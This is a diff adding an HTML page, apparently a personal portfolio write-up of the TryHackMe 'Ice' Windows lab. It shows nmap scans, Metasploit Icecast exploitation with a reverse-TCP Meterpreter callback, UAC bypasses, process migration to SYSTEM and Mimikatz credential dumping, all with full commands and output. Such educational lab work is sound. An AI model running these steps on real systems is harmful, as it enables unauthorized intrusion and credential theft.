@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>TryHackMe: Ice — Windows Privilege Escalation Walkthrough | Asahel Kipkemei</title>
+<meta name="description" content="A practical, step-by-step walkthrough of the TryHackMe Ice room: Icecast exploitation, UAC bypass troubleshooting, process migration, and credential enumeration with Kiwi, documented from a real lab session." />
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🛰️</text></svg>" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/styles.css" />
+</head>
+<body>
+
+<div class="scan-overlay" aria-hidden="true"></div>
+<div class="progress-bar" id="progressBar" aria-hidden="true"></div>
+
+<header class="site-header" id="siteHeader">
+  <nav class="nav" aria-label="Primary">
+    <a href="#hero" class="nav-brand">ICE<span>_</span>LOG</a>
+    <button class="nav-toggle" id="navToggle" aria-expanded="false" aria-controls="navMenu" aria-label="Toggle navigation menu">
+      <span></span><span></span><span></span>
+    </button>
+    <ul class="nav-menu" id="navMenu">
+      <li><a href="#about" class="nav-link">The Lab</a></li>
+      <li><a href="#dashboard" class="nav-link">Dashboard</a></li>
+      <li><a href="#walkthrough" class="nav-link">Walkthrough</a></li>
+      <li><a href="#results" class="nav-link">Results</a></li>
+      <li><a href="#lessons" class="nav-link">Lessons</a></li>
+      <li><a href="#faq" class="nav-link">Knowledge Check</a></li>
+    </ul>
+  </nav>
+</header>
+
+<main>
+
+<!-- HERO -->
+<section id="hero" class="hero">
+  <div class="hero-grid">
+    <div class="hero-copy">
+      <p class="hero-kicker">TryHackMe // Windows Exploitation Lab</p>
+      <h1>Ice: From Initial Access to <span class="accent">SYSTEM</span>-Level Privileges</h1>
+      <p class="hero-sub">A practical, hands-on lab write-up — reconstructed from my actual terminal sessions, mistakes included.</p>
+      <div class="hero-meta">
+        <span>Asahel Kipkemei</span>
+        <span class="dot">·</span>
+        <a href="mailto:mail@asahelkipkemeimutai.me">mail@asahelkipkemeimutai.me</a>
+      </div>
+      <div class="hero-links">
+        <a href="https://www.linkedin.com/in/asahel-mutai-176579328/" target="_blank" rel="noopener" class="pill-link">LinkedIn</a>
+        <a href="https://tryhackme.com/p/asahel.msc" target="_blank" rel="noopener" class="pill-link">TryHackMe Profile</a>
+      </div>
+      <div class="cert-preview" id="certPreview">
+        <!-- Populated only if certifications are provided. Edit in js/script.js -> CERTIFICATIONS -->
+      </div>
+      <div class="hero-actions">
+        <a href="#walkthrough" class="btn btn-primary">Explore the Walkthrough</a>
+        <a href="[INSERT TRYHACKME PROFILE URL]" target="_blank" rel="noopener" class="btn btn-ghost">View My Profile</a>
+      </div>
+    </div>
+
+    <div class="hero-term">
+      <div class="terminal" data-typing>
+        <div class="terminal-bar">
+          <span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span>
+          <span class="terminal-title">asahel@parrot: ~/labs/THM/Ice</span>
+        </div>
+        <pre class="terminal-body"><code><span class="prompt">┌──(asahel㉿parrot)-[~/labs/THM/Ice]</span>
+<span class="prompt">└─$</span> <span class="cmd-type" data-text="nmap -sS TARGET_IP --top-ports 50"></span>
+<span class="out">Starting Nmap 7.991 at 2026-11-13 21:10
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+8000/tcp  open  http-alt
+
+[+] Icecast media server found on 8000.
+[+] RDP exposed on 3389.</span></code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ABOUT -->
+<section id="about" class="section">
+  <div class="container">
+    <h2 class="section-title">About the Lab</h2>
+    <div class="about-grid">
+      <div class="about-text">
+        <p><strong>TryHackMe</strong> is a browser-based platform for learning offensive and defensive security inside isolated, disposable virtual machines. Every machine in this write-up lived inside TryHackMe's own network and was intentionally built to be broken into — nothing here was run against a system I didn't have explicit permission to attack.</p>
+        <p>The <strong>Ice</strong> room is a Windows 7 box built around a single idea: get a foothold through a vulnerable service, then fight your way from a low-privilege user up to <code>NT AUTHORITY\SYSTEM</code>. It's a good room precisely because the privilege escalation doesn't go smoothly on the first try — the box is x64, but the easiest tools default to x86, and that mismatch is the whole lesson.</p>
+        <p>Skills covered: network reconnaissance, exploiting a known Metasploit module, enumerating a freshly popped Windows host, diagnosing a failed exploit from its error message, bypassing User Account Control (UAC), migrating between processes, and pulling credentials out of memory with Mimikatz.</p>
+      </div>
+      <div class="about-tools">
+        <h3>Tools used</h3>
+        <ul class="tool-list">
+          <li><span class="tool-name">Parrot OS</span><span class="tool-desc">Attacker machine — a Linux distribution built for security work.</span></li>
+          <li><span class="tool-name">Nmap</span><span class="tool-desc">Network scanner used to find open ports and running services.</span></li>
+          <li><span class="tool-name">Metasploit Framework</span><span class="tool-desc">Exploitation framework used to weaponize known vulnerabilities and manage sessions.</span></li>
+          <li><span class="tool-name">Meterpreter</span><span class="tool-desc">The in-memory agent Metasploit drops on a target once exploitation succeeds.</span></li>
+          <li><span class="tool-name">Kiwi (Mimikatz)</span><span class="tool-desc">Meterpreter extension that exposes Mimikatz's credential-extraction features.</span></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- DASHBOARD -->
+<section id="dashboard" class="section section-alt">
+  <div class="container">
+    <h2 class="section-title">Lab Information Dashboard</h2>
+    <div class="dash-grid">
+      <div class="dash-card"><span class="dash-label">Platform</span><span class="dash-value">TryHackMe</span></div>
+      <div class="dash-card"><span class="dash-label">Room</span><span class="dash-value">Ice</span></div>
+      <div class="dash-card"><span class="dash-label">Target</span><span class="dash-value">DARK-PC</span></div>
+      <div class="dash-card"><span class="dash-label">Operating System</span><span class="dash-value">Windows 7 SP1</span></div>
+      <div class="dash-card"><span class="dash-label">Build</span><span class="dash-value">7601</span></div>
+      <div class="dash-card"><span class="dash-label">Architecture</span><span class="dash-value">x64</span></div>
+      <div class="dash-card"><span class="dash-label">Initial Access</span><span class="dash-value">Icecast Header Overflow</span></div>
+      <div class="dash-card"><span class="dash-label">Privilege Escalation</span><span class="dash-value">UAC Bypass (eventvwr)</span></div>
+      <div class="dash-card dash-card-wide"><span class="dash-label">Final Privilege</span><span class="dash-value accent">NT AUTHORITY\SYSTEM</span></div>
+    </div>
+    <div class="dash-ports">
+      <div class="port-card"><span class="port-num">3389</span><span class="port-name">Microsoft Remote Desktop</span></div>
+      <div class="port-card"><span class="port-num">8000</span><span class="port-name">Icecast Streaming Media Server</span></div>
+    </div>
+    <p class="note">TryHackMe assigns a fresh, temporary IP (and attacker VPN IP) for every lab session — they are never the same twice. This write-up uses <code>TARGET_IP</code> and <code>VPN_IP</code> as stand-ins everywhere a real address would normally appear.</p>
+  </div>
+</section>
+
+<!-- WALKTHROUGH -->
+<section id="walkthrough" class="section">
+  <div class="container">
+    <h2 class="section-title">The Walkthrough</h2>
+    <p class="section-intro">Eleven phases, in the order they actually happened — including the two exploit attempts that failed before the privilege escalation worked.</p>
+
+    <div class="toc">
+      <span class="toc-label">Jump to phase:</span>
+      <a href="#phase1">1. Recon</a><a href="#phase2">2. Initial Access</a><a href="#phase3">3. Enumeration</a>
+      <a href="#phase4">4. LPE Recon</a><a href="#phase5">5. Troubleshooting</a><a href="#phase6">6. Verifying</a>
+      <a href="#phase7">7. Migration</a><a href="#phase8">8. Kiwi</a>
+    </div>
+
+    <!-- PHASE 1 -->
+    <article class="phase" id="phase1">
+      <button class="phase-toggle" aria-expanded="true">
+        <span class="phase-num">01</span><span class="phase-title">Reconnaissance</span><span class="phase-arrow">▾</span>
+      </button>
+      <div class="phase-body">
+        <p>Before touching anything, the goal is simple: find out what's actually running on the box. Four scan types do that job here —</p>
+        <ul class="plain-list">
+          <li><strong>SYN scan (<code>-sS</code>)</strong> — sends a half-open connection to each port. Fast and relatively quiet, the default scan for most engagements.</li>
+          <li><strong>TCP connect scan (<code>-sT</code>)</strong> — completes the full three-way handshake. Slower, but doesn't need raw-socket privileges and works where SYN scans are blocked.</li>
+          <li><strong>Service/version detection (<code>-sV</code>) and default scripts (<code>-sC</code>)</strong> — once a port is known to be open, these figure out exactly what software is listening and run safe, informational probes against it.</li>
+          <li><strong>OS detection (<code>-O</code>)</strong> — fingerprints the TCP/IP stack to guess the operating system.</li>
+        </ul>
+
+        <div class="terminal">
+          <div class="terminal-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="terminal-title">recon</span></div>
+          <pre class="terminal-body"><code><span class="prompt">$</span> <span class="copy-cmd">nmap -sS TARGET_IP --top-ports 50</span>
+<span class="out">PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+8000/tcp  open  http-alt
+49152/tcp open  unknown
+49154/tcp open  unknown</span>
+
+<span class="prompt">$</span> <span class="copy-cmd">nmap -sT TARGET_IP</span>
+<span class="out">PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+5357/tcp  open  wsdapi
+8000/tcp  open  http-alt
+49152-49160/tcp open unknown (x4)</span>
+
+<span class="prompt">$</span> <span class="copy-cmd">nmap -sC -sV -p 8000 TARGET_IP</span>
+<span class="out">PORT     STATE SERVICE VERSION
+8000/tcp open  http    Icecast streaming media server
+|_http-title: Site doesn't have a title (text/html).</span>
+
+<span class="prompt">$</span> <span class="copy-cmd">nmap -sC -sV -p 3389 TARGET_IP</span>
+<span class="out">PORT     STATE SERVICE        VERSION
+3389/tcp open  ms-wbt-server?
+| rdp-ntlm-info:
+|   Target_Name: DARK-PC
+|   NetBIOS_Computer_Name: DARK-PC
+|   DNS_Computer_Name: Dark-PC
+|_  Product_Version: 6.1.7601</span></code></pre>
+        </div>
+
+        <div class="callout callout-info">
+          <strong>Challenge encountered:</strong> a full <code>nmap -sV -sC -O -p- TARGET_IP</code> scan was attempted twice but never finished in a reasonable window — scanning all 65,535 ports with scripts and OS detection on a lab VM can simply take a long time. Rather than wait it out, the scan was narrowed to the two ports that actually mattered (8000 and 3389), which is a perfectly normal real-world trade-off: scan broad first, then scan deep on what matters.
+        </div>
+
+        <p><strong>Why it matters:</strong> the RDP NTLM info script didn't need a login to leak the hostname (<code>DARK-PC</code>) and the Windows build (<code>6.1.7601</code>, i.e. Windows 7 SP1) directly from the TLS handshake metadata — free intelligence before a single exploit is fired.</p>
+
+        <div class="result-box"><strong>Result:</strong> two services of interest — Icecast on 8000, RDP on 3389 — against a Windows 7 SP1 (build 7601) host named DARK-PC.</div>
+      </div>
+    </article>
+
+    <!-- PHASE 2 -->
+    <article class="phase" id="phase2">
+      <button class="phase-toggle" aria-expanded="true">
+        <span class="phase-num">02</span><span class="phase-title">Initial Access — Icecast Exploitation</span><span class="phase-arrow">▾</span>
+      </button>
+      <div class="phase-body">
+        <p>Icecast is streaming-media server software. Version detection flagged it on port 8000, and Metasploit happens to ship a matching exploit for an old header-overflow bug in that exact service.</p>
+        <p><strong>Metasploit</strong> is a framework for finding, configuring, and firing known exploits without writing the low-level shellcode by hand. A <strong>reverse TCP</strong> payload tells the target to connect back out to the attacker, which sidesteps inbound firewall rules. Once that payload lands, it unpacks into a <strong>Meterpreter</strong> session — an in-memory agent that gives interactive control of the target without ever touching disk as a traditional executable.</p>
+
+        <div class="terminal">
+          <div class="terminal-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="terminal-title">msfconsole</span></div>
+          <pre class="terminal-body"><code><span class="prompt">msf ></span> <span class="copy-cmd">search icecast</span>
+<span class="out">0  exploit/windows/http/icecast_header  2004-09-28  great  Icecast Header Overwrite</span>
+
+<span class="prompt">msf ></span> <span class="copy-cmd">use exploit/windows/http/icecast_header</span>
+<span class="prompt">msf exploit(windows/http/icecast_header) ></span> <span class="copy-cmd">set RHOSTS TARGET_IP</span>
+<span class="prompt">msf exploit(windows/http/icecast_header) ></span> <span class="copy-cmd">set LHOST VPN_IP</span>
+<span class="prompt">msf exploit(windows/http/icecast_header) ></span> <span class="copy-cmd">exploit</span>
+<span class="out">[*] Started reverse TCP handler on VPN_IP:4444
+[*] Sending stage (203455 bytes) to TARGET_IP
+[*] Meterpreter session 1 opened (VPN_IP:4444 -> TARGET_IP:49234)</span></code></pre>
+        </div>
+
+        <p><strong>Why LHOST matters:</strong> LHOST is the address the target will call back to once exploited. Get it wrong (point it at the wrong interface, or forget the VPN tunnel address TryHackMe assigns) and the handler sits there forever waiting for a connection that can never arrive.</p>
+
+        <div class="result-box"><strong>Result:</strong> Meterpreter session 1, running as <code>Dark-PC\Dark</code> — a real foothold, but just a standard user, not an administrator.</div>
+      </div>
+    </article>
+
+    <!-- PHASE 3 -->
+    <article class="phase" id="phase3">
+      <button class="phase-toggle" aria-expanded="true">
+        <span class="phase-num">03</span><span class="phase-title">System Enumeration</span><span class="phase-arrow">▾</span>
+      </button>
+      <div class="phase-body">
+        <p>Two quick commands to orient inside the new session:</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="terminal-title">meterpreter</span></div>
+          <pre class="terminal-body"><code><span class="prompt">meterpreter ></span> <span class="copy-cmd">sysinfo</span>
+<span class="out">Computer        : DARK-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+Domain          : WORKGROUP
+Meterpreter     : x86/windows</span>
+
+<span class="prompt">meterpreter ></span> <span class="copy-cmd">getuid</span>
+<span class="out">Server username: Dark-PC\Dark</span></code></pre>
+        </div>
+        <div class="callout callout-warning">
+          <strong>The detail that drives the rest of this walkthrough:</strong> the <em>operating system</em> is x64, but the <em>Meterpreter process</em> that landed is x86. Icecast itself is a 32-bit application, so the shellcode that rode in through it is 32-bit too — even though it's sitting on a 64-bit OS. Mixing those up is exactly what caused the failures in Phase 5.
+        </div>
+      </div>
+    </article>
+
+    <!-- PHASE 4 -->
+    <article class="phase" id="phase4">
+      <button class="phase-toggle" aria-expanded="true">
+        <span class="phase-num">04</span><span class="phase-title">Local Privilege Escalation Reconnaissance</span><span class="phase-arrow">▾</span>
+      </button>
+      <div class="phase-body">
+        <p>A foothold as a standard user doesn't mean the box is "owned." <strong>Local privilege escalation</strong> is the process of turning that limited access into administrator or SYSTEM-level control — usually by abusing a misconfiguration, an unpatched bug, or a trusted process that runs with higher rights than the user who triggers it.</p>
+        <p>Metasploit's local exploit suggester automates the first pass: it checks the target's patch level and configuration against its library of known local exploits and reports which ones look applicable.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="terminal-title">meterpreter</span></div>
+          <pre class="terminal-body"><code><span class="prompt">meterpreter ></span> <span class="copy-cmd">run post/multi/recon/local_exploit_suggester</span>
+<span class="out">[+] exploit/windows/local/bypassuac_comhijack: appears vulnerable
+[+] exploit/windows/local/bypassuac_eventvwr: appears vulnerable
+[+] exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: could not be validated
+[+] exploit/windows/local/ms13_081_track_popup_menu: appears vulnerable
+[+] exploit/windows/local/tokenmagic: appears vulnerable
+ ...(13 candidate exploits in total)</span></code></pre>
+        </div>
+        <p><strong>Why validation still matters:</strong> "appears vulnerable" is a heuristic, not a guarantee — the module checks version numbers and config flags, not whether the exploit will actually pop a session on this specific build. The first module tried from this list, <code>bypassuac_comhijack</code>, is a perfect example of why.</p>
+      </div>
+    </article>
+
+    <!-- PHASE 5 -->
+    <article class="phase" id="phase5">
+      <button class="phase-toggle" aria-expanded="true">
+        <span class="phase-num">05</span><span class="phase-title">Troubleshooting the Architecture Mismatch</span><span class="phase-arrow">▾</span>
+      </button>
+      <div class="phase-body">
+        <p>This is the part of the lab that actually teaches something. The suggester's top pick was tried first:</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="terminal-title">msfconsole</span></div>
+          <pre class="terminal-body"><code><span class="prompt">msf ></span> <span class="copy-cmd">use exploit/windows/local/bypassuac_comhijack</span>
+<span class="prompt">msf exploit(...) ></span> <span class="copy-cmd">set SESSION 1</span>
+<span class="prompt">msf exploit(...) ></span> <span class="copy-cmd">set LHOST VPN_IP</span>
+<span class="prompt">msf exploit(...) ></span> <span class="copy-cmd">run</span>
+<span class="out">[+] The target appears to be vulnerable.
+[-] Exploit aborted due to failure: bad-config: x86 payload selected for x64 system
+[*] Exploit completed, but no session was created.</span></code></pre>
+        </div>
+        <div class="callout callout-error">
+          <strong>Challenge:</strong> the error says exactly what Phase 3 warned about. The module defaulted to an x86 payload because the current Meterpreter session is x86, but <code>bypassuac_comhijack</code> needs its payload architecture to match the <em>operating system</em> (x64), not the session that's calling it.
+        </div>
+        <p>Rather than guess, the fix is to read the module's own documentation and see what it actually expects:</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="terminal-title">msfconsole</span></div>
+          <pre class="terminal-body"><code><span class="prompt">msf exploit(...) ></span> <span class="copy-cmd">info exploit/windows/local/bypassuac_comhijack</span>
+<span class="out">This module requires the architecture of the payload to match the OS,
+but the current low-privilege Meterpreter session architecture can be different.</span>
+
+<span class="prompt">msf exploit(...) ></span> <span class="copy-cmd">show payloads</span>
+<span class="out">... 241  payload/windows/x64/meterpreter/reverse_tcp  normal  No ...</span>
+
+<span class="prompt">msf exploit(...) ></span> <span class="copy-cmd">set payload windows/x64/meterpreter/reverse_tcp</span>
+<span class="prompt">msf exploit(...) ></span> <span class="copy-cmd">run</span>
+<span class="out">[+] Part of Administrators group! Continuing...
+[+] BypassUAC can bypass this setting, continuing...
+[*] Uploading payload to C:\Users\Dark\AppData\Local\Temp\...dll
+[*] Executing high integrity process C:\Windows\System32\mmc.exe
+[*] Exploit completed, but no session was created.</span></code></pre>
+        </div>
+        <div class="callout callout-error">
+          <strong>Challenge (continued):</strong> forcing the x64 payload fixed the architecture error, but the exploit still didn't hand back a session. <code>bypassuac_comhijack</code> is confirmed here to <strong>not</strong> have succeeded on this box — it ran, uploaded a DLL, and executed a high-integrity process, but no stage ever called back. This result is reported honestly rather than claimed as a win.
+        </div>
+        <p>With the first UAC bypass a dead end, the suggester's second candidate was tried instead:</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="terminal-title">msfconsole</span></div>
+          <pre class="terminal-body"><code><span class="prompt">msf ></span> <span class="copy-cmd">use exploit/windows/local/bypassuac_eventvwr</span>
+<span class="prompt">msf exploit(...) ></span> <span class="copy-cmd">set SESSION 1</span>
+<span class="prompt">msf exploit(...) ></span> <span class="copy-cmd">set LHOST VPN_IP</span>
+<span class="prompt">msf exploit(...) ></span> <span class="copy-cmd">run</span>
+<span class="out">[+] Part of Administrators group! Continuing...
+[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
+[+] eventvwr.exe executed successfully, waiting 10 seconds...
+[*] Sending stage (203455 bytes) to TARGET_IP
+[*] Meterpreter session 2 opened</span></code></pre>
+        </div>
+        <p>This one worked on the first run — because <code>eventvwr.exe</code> is launched through <code>SysWOW64</code>, the 32-bit compatibility layer, the module's default x86 payload was already the correct architecture. No manual payload override needed.</p>
+        <div class="result-box"><strong>Result:</strong> a second Meterpreter session, elevated via UAC bypass. The original session 1 is left running in the background the whole time — Metasploit doesn't close old sessions automatically.</div>
+      </div>
+    </article>
+
+    <!-- PHASE 6 -->
+    <article class="phase" id="phase6">
+      <button class="phase-toggle" aria-expanded="true">
+        <span class="phase-num">06</span><span class="phase-title">Verifying Privileges</span><span class="phase-arrow">▾</span>
+      </button>
+      <div class="phase-body">
+        <p>A successful exploit opens a brand-new session rather than upgrading the old one in place, so both now exist side by side:</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="terminal-title">msfconsole</span></div>
+          <pre class="terminal-body"><code><span class="prompt">msf ></span> <span class="copy-cmd">sessions</span>
+<span class="out">Id  Type                     Information
+1   meterpreter x86/windows  Dark-PC\Dark @ DARK-PC
+2   meterpreter x86/windows  Dark-PC\Dark @ DARK-PC</span>
+
+<span class="prompt">msf ></span> <span class="copy-cmd">sessions -i 2</span>
+<span class="prompt">meterpreter ></span> <span class="copy-cmd">getprivs</span>
+<span class="out">SeDebugPrivilege
+SeImpersonatePrivilege
+SeBackupPrivilege
+SeRestorePrivilege
+ ...(23 privileges enabled)</span></code></pre>
+        </div>
+        <p><strong>Administrator vs. SYSTEM:</strong> UAC bypass elevates the process to a high-integrity <em>administrator</em> token — a real privilege jump, but still bounded by the Administrators group. <code>NT AUTHORITY\SYSTEM</code> is a level above that: the account the operating system itself runs as, with no restrictions a normal admin account has. Session 2's new privileges (like <code>SeDebugPrivilege</code>) are exactly what's needed to take that next step.</p>
+      </div>
+    </article>
+
+    <!-- PHASE 7 -->
+    <article class="phase" id="phase7">
+      <button class="phase-toggle" aria-expanded="true">
+        <span class="phase-num">07</span><span class="phase-title">Process Enumeration and Migration</span><span class="phase-arrow">▾</span>
+      </button>
+      <div class="phase-body">
+        <p>Every running program on Windows is a numbered <strong>process</strong> (PID), owned by some account, running at some privilege level, compiled for some architecture. Listing them shows exactly who owns what:</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="terminal-title">meterpreter</span></div>
+          <pre class="terminal-body"><code><span class="prompt">meterpreter ></span> <span class="copy-cmd">ps</span>
+<span class="out">PID   Name            Arch  User
+704   lsass.exe       x64   NT AUTHORITY\SYSTEM
+1272  spoolsv.exe     x64   NT AUTHORITY\SYSTEM
+2612  TrustedInstaller.exe x64  NT AUTHORITY\SYSTEM
+3652  powershell.exe  x86   Dark-PC\Dark</span></code></pre>
+        </div>
+        <p><strong>Process migration</strong> moves the Meterpreter agent out of the process it currently lives in and into a different one, inheriting that process's owner and privilege level. <code>lsass.exe</code> (Local Security Authority Subsystem) is the classic target because it holds credential material in memory — but migrating straight into it is risky and the lab specifically calls for something safer with matching architecture and privilege: the <strong>Print Spooler</strong> service, <code>spoolsv.exe</code>, which runs as SYSTEM, is x64 like the OS, and is stable enough to migrate into without crashing the session.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="terminal-title">meterpreter</span></div>
+          <pre class="terminal-body"><code><span class="prompt">meterpreter ></span> <span class="copy-cmd">migrate -N spoolsv.exe</span>
+<span class="out">[*] Migrating from 3652 to 1272...
+[*] Migration completed successfully.</span>
+
+<span class="prompt">meterpreter ></span> <span class="copy-cmd">getuid</span>
+<span class="out">Server username: NT AUTHORITY\SYSTEM</span></code></pre>
+        </div>
+        <div class="result-box"><strong>Result:</strong> full SYSTEM privileges, obtained by riding into a process that already had them rather than exploiting anything further.</div>
+      </div>
+    </article>
+
+    <!-- PHASE 8 -->
+    <article class="phase" id="phase8">
+      <button class="phase-toggle" aria-expanded="true">
+        <span class="phase-num">08</span><span class="phase-title">Credential Enumeration with Kiwi</span><span class="phase-arrow">▾</span>
+      </button>
+      <div class="phase-body">
+        <p><strong>Mimikatz</strong> is a well-known Windows post-exploitation tool that can pull plaintext passwords, hashes, and Kerberos tickets straight out of a running process's memory — most famously LSASS. In authorized assessments, it's used to show exactly how far a single compromised credential can travel across a network, which is what drives real-world patching priorities. <strong>Kiwi</strong> is the Meterpreter extension that ships Mimikatz's functionality as native Meterpreter commands.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="terminal-title">meterpreter</span></div>
+          <pre class="terminal-body"><code><span class="prompt">meterpreter ></span> <span class="copy-cmd">load kiwi</span>
+<span class="out">Loading extension kiwi...
+  mimikatz 2.2.0 (x64/windows)
+Success.</span>
+
+<span class="prompt">meterpreter ></span> <span class="copy-cmd">help</span>
+<span class="out">Kiwi Commands
+=============
+creds_all       Retrieve all credentials (parsed)
+creds_kerberos  Retrieve Kerberos creds (parsed)
+creds_msv       Retrieve LM/NTLM creds (parsed)
+dcsync          Retrieve user account info via DCSync</span>
+
+<span class="prompt">meterpreter ></span> <span class="copy-cmd">creds_all</span>
+<span class="out">[+] Running as SYSTEM
+[*] Retrieving all credentials
+(see spoiler below)</span></code></pre>
+        </div>
+        <p><code>creds_all</code> dumps every credential type Mimikatz knows how to read from memory in one pass — NTLM hashes, WDigest plaintext (if the box has it enabled), TsPkg, and Kerberos tickets — all in a single command.</p>
+
+        <div class="spoiler" id="credSpoiler">
+          <button class="spoiler-btn" id="spoilerBtn" aria-expanded="false">Reveal the lab credential — spoiler</button>
+          <div class="spoiler-content" id="spoilerContent" hidden>
+            <p class="spoiler-warning">⚠️ This credential belongs exclusively to a disposable TryHackMe training machine. It is not a real account, was never meant to be secret, and must never be reused anywhere.</p>
+            <dl class="cred-list" id="credList"></dl>
+          </div>
+        </div>
+
+        <div class="callout callout-info">
+          <strong>Why this matters:</strong> credentials and hashes recovered this way are extremely sensitive in a real environment — an NTLM hash alone is often enough to authenticate elsewhere without ever cracking the plaintext ("pass the hash"). That's exactly why this page never prints them as plain, searchable text — they're base64-encoded in the page's data and only rendered after you deliberately click reveal.
+        </div>
+      </div>
+    </article>
+
+  </div>
+</section>
+
+<!-- RESULTS -->
+<section id="results" class="section section-alt">
+  <div class="container">
+    <h2 class="section-title">Final Lab Results</h2>
+    <ul class="timeline">
+      <li class="done">Initial access achieved via Icecast exploitation</li>
+      <li class="done">Windows 7 SP1 (DARK-PC) environment enumerated</li>
+      <li class="done">First UAC bypass attempt (<code>bypassuac_comhijack</code>) diagnosed and ruled out</li>
+      <li class="done">Local privilege escalation completed via <code>bypassuac_eventvwr</code></li>
+      <li class="done">Process migration to <code>spoolsv.exe</code> completed</li>
+      <li class="done">SYSTEM-level privileges obtained</li>
+      <li class="done">Kiwi loaded and credentials successfully enumerated</li>
+    </ul>
+  </div>
+</section>
+
+<!-- LESSONS -->
+<section id="lessons" class="section">
+  <div class="container">
+    <h2 class="section-title">Lessons Learned</h2>
+    <div class="lesson-grid">
+      <div class="lesson-card"><h3>Recon first, always</h3><p>Every useful fact in this lab — the service names, the hostname, the OS build — came from scanning before a single exploit was fired. Skipping recon means exploiting blind.</p></div>
+      <div class="lesson-card"><h3>x86 vs x64 is not cosmetic</h3><p>A session's own architecture and the target OS's architecture are two separate facts. Confusing them is the single most common reason a "should work" local exploit quietly fails.</p></div>
+      <div class="lesson-card"><h3>Read the module before running it</h3><p><code>info</code> and <code>show payloads</code> turned a cryptic error into a clear fix. Documentation exists for a reason.</p></div>
+      <div class="lesson-card"><h3>Troubleshoot systematically</h3><p>When <code>bypassuac_comhijack</code> failed twice, the response was to change one variable (the payload architecture) at a time and re-test — not to guess randomly.</p></div>
+      <div class="lesson-card"><h3>Processes carry identity</h3><p>A process's architecture, owner, and privilege level all travel with it. Migrating into the right process is sometimes the entire privilege escalation.</p></div>
+      <div class="lesson-card"><h3>SYSTEM is the real ceiling</h3><p>Administrator still has a ceiling. SYSTEM does not — it's the account the OS itself trusts completely.</p></div>
+      <div class="lesson-card"><h3>Exposed credentials travel far</h3><p>A single reused password or hash can be the only thing standing between a single compromised box and an entire network.</p></div>
+      <div class="lesson-card"><h3>Disabled controls widen the blast radius</h3><p>UAC, patch levels, and service hardening all exist to add friction. Every one that's missing or outdated is one less thing an attacker has to work around.</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section id="faq" class="section section-alt">
+  <div class="container">
+    <h2 class="section-title">Knowledge Check</h2>
+    <div class="faq-list" id="faqList">
+      <!-- populated by js/script.js -->
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer class="site-footer">
+  <div class="container footer-grid">
+    <div>
+      <p class="footer-name">Asahel Kipkemei</p>
+      <p class="footer-sub">Cybersecurity learner &amp; practitioner</p>
+    </div>
+    <div class="footer-links">
+      <a href="mailto:mail@asahelkipkemeimutai.me">Email</a>
+      <a href="[INSERT LINKEDIN PROFILE URL]" target="_blank" rel="noopener">LinkedIn</a>
+      <a href="[INSERT TRYHACKME PROFILE URL]" target="_blank" rel="noopener">TryHackMe</a>
+    </div>
+  </div>
+  <p class="footer-note">All activity documented here took place inside an authorized TryHackMe training environment.</p>
+</footer>
+
+<button id="backToTop" class="back-to-top" aria-label="Back to top">↑</button>
+
+<script src="js/script.js"></script>
+</body>
+</html>
